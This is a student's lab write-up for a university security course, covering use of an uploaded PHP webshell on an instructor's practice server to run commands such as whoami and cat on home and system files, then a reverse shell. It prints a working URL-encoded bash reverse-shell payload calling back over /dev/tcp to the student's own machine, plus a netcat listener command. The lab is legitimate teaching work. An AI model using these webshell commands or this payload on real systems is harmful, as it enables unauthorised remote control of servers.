***Lucky Beulla Muhoza***

***CS 338***

***Prof. Jeff Ondich***

## FIRST REVERSE SHELL ##

### Part 1: Installing a PHP webshell ###

a. Explain how you can execute the Linux command whoami on the server using your webshell. What result do you get when you execute that command?

>  *To execute the whoami command on the server, I accessed the path to my uploaded web shell file in the URL and included ***?command=whoami****, so my URL looks like this: 
 http://danger.jeffondich.com/uploadedimages/muhozal-webshell1.php?command=whoami
>
>  *The uploaded PHP code then checks if a command parameter is provided in the URL and executes that specified command through the system function, thus allowing remote code execution.
The resulting output is the name of the user under which the web server is running, in this case www-data.*


b. What is this webshell's ```<pre>``` tag for? (And more to the point, what happens if you leave it out?)

> *The ```<pre>``` tag ensures that the output from the system function is displayed in a well-structured and readable way. Leaving out the tag would result into a messy output since HTML would ignore whitespace and line breaks thus making elements like lists of files or directories harder to read.*

*****
### Part 2: Looking around ###

a. What directory is danger's website located in?

> *Using the **pwd** command, the directory in which danger's website is located in is: **/var/www/danger.jeffondich.com***

b. What are the names of all the user accounts on danger.jeffondich.com? How do you know?

> *Using ```command=ls /home```, I was able to find the two main user directories on danger.jeffondich.com in the home directory. These user accounts are **bullwinkle** and **jeff***

c. Do you have access to the file /etc/passwd? What's in it?

> *I attempted to access ```/etc/passwd``` using ```cat /etc/passwd``` but encountered a site error, suggesting that direct access to the file is restricted.*

d. Do you have access to the file /etc/shadow? What's in it? (You'll have to look onliine for the answer to that second question, since the answer to the first is no.)

> *No, I do not have access to ```/etc/shadow```.*
>
> *This file stores encrypted user passwords and other information about user accounts. Each entry typically includes fields like the username, hashed password, last password change, and password expiration policies.*

e. There may be some secret files scattered around. See how many you can find and report on your discoveries.

> *I found a moose using ```command=cat /home/jeff/supersecret.txt```*

f. [Optional] Report on anything else interesting you discover.

> *I was frustrated but eventually found it helpful that the ```cd``` command does not work in web shell.*
> 
> *I learned that when I send a command via a PHP web shell, it’s executed in a new, isolated shell session every time. Any directory changes made with cd exist only in that temporary shell, which closes immediately after the command runs. This allows me to explore diffent directories without needing ```cd```.*

****
### Part 3: Setup for part 4 ###
****

### Part 4: Launching a reverse shell ###

a. What is the IP address of your Kali VM (the target machine)? How did you find out?

> *The IP address of my Kali VM in 192.168.64.2. I found it by running the `ip a` command in my Kali terminal and inspecting the eth0 interface section*

b. What are the IP addresses of your host OS (the attacking machine)? How did you find out? Which one should you use to communicate with Kali and why?

> *I was able to obtain the IP address of my macOS by running the `ifconfig | grep inet` command in my terminal. Here is the list of present IP addressed:*
>
>```
>	inet 127.0.0.1 netmask 0xff000000
>	inet6 ::1 prefixlen 128 
>	inet6 fe80::1%lo0 prefixlen 64 scopeid 0x1 
>	inet6 fe80::a494:37ff:fecf:e5d5%ap1 prefixlen 64 scopeid 0xb 
>	inet6 fe80::1c5b:29b2:d71e:3487%en0 prefixlen 64 secured scopeid 0xc 
>	inet 10.133.0.214 netmask 0xffffe000 broadcast 10.133.31.255
>	inet6 fe80::4c06:6dff:fe19:7ce2%awdl0 prefixlen 64 scopeid 0xd 
>	inet6 fe80::4c06:6dff:fe19:7ce2%llw0 prefixlen 64 scopeid 0xe 
>	inet6 fe80::a05f:d8e8:8da2:d878%utun0 prefixlen 64 scopeid 0xf 
>	inet6 fe80::d48b:7e2a:ed1d:51fa%utun1 prefixlen 64 scopeid 0x10 
>	inet6 fe80::9b38:4747:3b6c:256d%utun2 prefixlen 64 scopeid 0x11 
>	inet6 fe80::ce81:b1c:bd2c:69e%utun3 prefixlen 64 scopeid 0x12 
>	inet6 fe80::4942:7591:c656:402e%utun4 prefixlen 64 scopeid 0x13 
>	inet6 fe80::7001:54e0:1851:ca5d%utun5 prefixlen 64 scopeid 0x14 
>	inet6 fe80::4a03:9414:840e:86b2%utun6 prefixlen 64 scopeid 0x17 
>	inet6 fe80::6905:89f9:1401:c108%utun7 prefixlen 64 scopeid 0x18 
>	inet 192.168.64.1 netmask 0xffffff00 broadcast 192.168.64.255
>	inet6 fe80::8494:37ff:fefc:8b64%bridge100 prefixlen 64 scopeid 0x16 
>	inet6 fd6a:c3ab:6dda:5cc4:1c66:5278:ac7d:564 prefixlen 64 autoconf secured 
>```
> *The **IP 192.168.64.1** should be used to communicate with Kali, given that my Kali VM has the **IP address 192.168.64.2**. This makes both machines part of the same local network, allowing for direct communication.*

c. On your host OS (the attacker), pick any port number between 5000 and 10000 and run nc -l -p YOUR_CHOSEN_PORT

> *Ran the command nc -l 5050 in my mac terminal*

d. In a browser on your host machine, use your web shell to go to this crazy URL.

> *My URL is: http://192.168.64.2/webshell.php?command=bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/192.168.64.1/5050%200%3E%261%22*

e. Go back and look at your nc -l -p terminal on your host OS (attacking machine). Do you have a shell now? Is it letting you execute commands on Kali? How do you know it's Kali?

> *I have successfully established a reverse shell connection from my Kali VM back to my macOS. The output show `www-data@kali:/var/www/html$`*
>
> *Yes, I can execute commands on Kali from my macOS now. Here is a screenshot of the `ls` command that listed the files in the `/var/www/html` directory and `whoami` command that displayed the username of the current user on Kali:*
>
>  <img width="255" alt="Screenshot 2024-10-29 at 2 55 31 PM" src="https://github.com/user-attachments/assets/ea34c3b3-f027-4dc6-97d0-bf108de33cf9">
>
> *I know the shell is from my Kali because the prompt shows `www-data@kali`, where www-data is the username and kali is the hostname of the Kali VM. And, when I run pwd to see my current working directory, the output is `/var/www/html`, which is the default location for the Apache web server on Kali Linux.*

f. What are all those % codes in the URL you used?


g. Write a brief description, probably including a diagram, explaining how this reverse shell is functioning.
